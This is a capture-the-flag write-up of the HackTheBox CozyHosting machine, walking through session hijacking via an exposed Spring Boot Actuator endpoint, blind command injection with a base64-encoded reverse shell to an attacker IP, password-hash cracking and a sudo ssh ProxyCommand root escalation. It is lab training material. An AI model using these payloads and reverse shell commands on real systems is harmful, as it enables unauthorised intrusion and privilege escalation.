---
title: HackTheBox CozyHosting Writeup
authors: Samarth
date: 2023-09-15 08:00:00 +0530
categories: [HackTheBox Machines]
tags: [Linux, Session Hijacking, Blind Command Injection]
math: true
mermaid: true
---

![CozyHosting - HTB](/assets/images/writeups/CozyHosting-HTB/banner.png)

## TL:DR
 
This write-up is based on the [__CozyHosting__](https://app.hackthebox.com/machines/CozyHosting){:target="_blank"} machine, which is an easy-rated Linux box on HacktheBox. The machine hosts a website that enables users to host multiple projects using `Spring Boot Actuator`, which is accessible via an HTTP service. By utilizing `session hijacking`, we achieved unauthorized access to the Admin panel.

Furthermore, the Admin panel allows us to connect to any SSH server by providing a `hostname` and `username`. The `username` field is vulnerable to `blind command injection`, leading to access to the `app` user on the system. Later on, a compressed JAR file leaked the credentials of PostgreSQL, allowing us to obtain the password of the user `Josh`. Within the compromised environment, we gained room access by escalating privileges using ProxyCommand.

## Scanning Network

I began with an Nmap scan and identified open ports 22 and 80 for SSH and nginx, respectively. By extracting banners using Nmap, we determined that the `nginx` version is `1.18.0`. Let's review the Nmap results.

```bash
Command - nmap -sC -sV -A <ip address>

Nmap scan report for 10.10.11.230
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2023-09-15 11:41:22 IST for 961s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

We have discovered two services: SSH and HTTP. Let's begin by enumerating the HTTP service. Allow us to delve into the enumeration phase.

## Enumeration

We have observed that in Nmap scan, IP address gives us a reference to a domain name `cozyhosting.htb`. So, we have to add this domain to `"/etc/hosts"` file.

Let's open [http://cozyhosting.htb/](https://cozyhosting.htb){:target="_blank"}.

![Browser View](/assets/images/writeups/CozyHosting-HTB/1.png)

`CozyHosting` - "The right place to host a project of any complexity. Choose a plan, deploy your application and relax. Because we are going to take care of the rest". We got login page to access the dashboard." 

Let's initiate directory fuzzing to discover any potentially interesting directories or parameters.

```bash

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )                                                                                                                                      
                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Target: http://cozyhosting.htb/

 Starting: 
 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
 200 -   15B  - /actuator/health                                  
 200 -  634B  - /actuator                                         
 200 -    5KB - /actuator/env                                     
 200 -   10KB - /actuator/mappings                                
 200 -  195B  - /actuator/sessions                                
 200 -  124KB - /actuator/beans                                   
 200 -    0B  - /engine/classes/swfupload//swfupload.swf          
 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf       
 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
 200 -    0B  - /extjs/resources//charts.swf                      
 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
 200 -   12KB - /index                                            
 200 -    4KB - /login                                            
 200 -    0B  - /login.wdm%2e                                     
```

`Actuator?`!! What is that? `Spring Boot Actuator` is a set of production-ready features and tools provided by the Spring Boot framework to help you monitor and manage your Spring Boot application in a production environment. It provides various out-of-the-box functionalities that allow you to inspect and interact with your application while it's running. 

We have discovered an interesting path at `/actuator/sessions`. Let's visit it and see if we can find anything valuable.

![Found actuator session](/assets/images/writeups/CozyHosting-HTB/2.png)

We have found some session IDs labeled as `JSESSIONID`, and one of them contains the session ID of a user named `kanderson`. Let's utilize that `JSESSIONID` and attempt to log in as `kanderson`.

![Found JSESSION ID](/assets/images/writeups/CozyHosting-HTB/3.png)

We successfully gained access to the admin dashboard as `kanderson` using the found session ID.

Additionally, we discovered a service that allows us to connect to an SSH server using a `Hostname` and `Username`.

![Service for SSH](/assets/images/writeups/CozyHosting-HTB/4.png)

Let's use our own hostname as `10.10.14.32` and username as `kali`.

![Setting hostname and username](/assets/images/writeups/CozyHosting-HTB/5.png)

We found that the server generates an error during connection. Let's attempt a connection by providing only the `Hostname`.

![Providing hostname only](/assets/images/writeups/CozyHosting-HTB/6.png)

We observed that the server returned the SSH usage information. Now, let's try providing `;` in the `username` field and observe the response.

![Username](/assets/images/writeups/CozyHosting-HTB/7.png)

"We have observed in the response that it returns `command not found`. Let's try using a blank space in the `username` field and see how it responds.

![Blank space](/assets/images/writeups/CozyHosting-HTB/8.png)

## Exploitation

Through multiple test cases on the `username` field, we have observed different responses from the server:

- The server doesn't allow whitespace in the `username` field.
- If we use `;` or `|` in the username field, the server responds with command not found, indicating that a command is being executed from a terminal.

Based on these test cases, it appears that the username field is vulnerable to <b>`Blind Command Injection`</b>. Therefore, we are planning to use a one-liner payload in the `username` field.

First we will convert the payload to `base64` format -

```bash
Payload - echo 'sh -i >& /dev/tcp/10.10.14.32/4444 0>&1' | base64
```

Once we get the `base64` encoded text, we will make the main payload as - 

The `Internal Field Separator (IFS)` is an important concept in Unix-like operating systems, especially when working with shell scripting and text processing. It's an environment variable that defines the delimiter used to split text strings into fields. The default value for the IFS is typically a space, tab, and newline character, but you can customize it to use different delimiters as needed.

```bash
Payload - ;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzIvNDQ0NCAwPiYxCg=="|
          base64${IFS}-d|bash;
```

Before using this payload, let's start the netcat listener on port `4444`.

![Setting up listener](/assets/images/writeups/CozyHosting-HTB/9.png)

As we observed that the payload is executed, but it is taking time to receive a response from the server. In the meantime, let's check our listener to see if we have received a shell or not.

![Got shell](/assets/images/writeups/CozyHosting-HTB/10.png)

We have successfully obtained a shell as the `app` user.

Additionally, we have found a `.jar` file named `cloudhosting-0.0.1.jar`.

![Found jar file](/assets/images/writeups/CozyHosting-HTB/11.png)

Let's decompress this file using `unzip` and try to see if we can find anything interesting.

![Unzipping file](/assets/images/writeups/CozyHosting-HTB/12.png)

We have found the credentials for `postgres`. Let's connect using the `postgres` credentials.

```plaintext
Command - psql -h <victim_ip> -U postgres -d cozyhosting
```

```
cozyhosting=# SELECT * FROM users;

   name    |                           password                           | role
-----------+--------------------------------------------------------------+------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

```

We have found the bcrypt hash for the user `john`. Let's use `John the Ripper` to find the password.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**************** (?)
1g 0:00:00:23 DONE (2023-09-26 20:07) 0.04299g/s 120.7p/s 120.7c/s 120.7C/s onlyme..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
![Found password](/assets/images/writeups/CozyHosting-HTB/13.png)

Let's list the allowed commands to invoking the user using `sudo -l`.

![Listing allowed commands](/assets/images/writeups/CozyHosting-HTB/14.png)

Let's check the [gtfobins](https://gtfobins.github.io){:target="_blank"} for privilege escalation.

Found payload - `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

![Privilege escalation using gtfobins](/assets/images/writeups/CozyHosting-HTB/15.png)

That's all in this writeup.

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.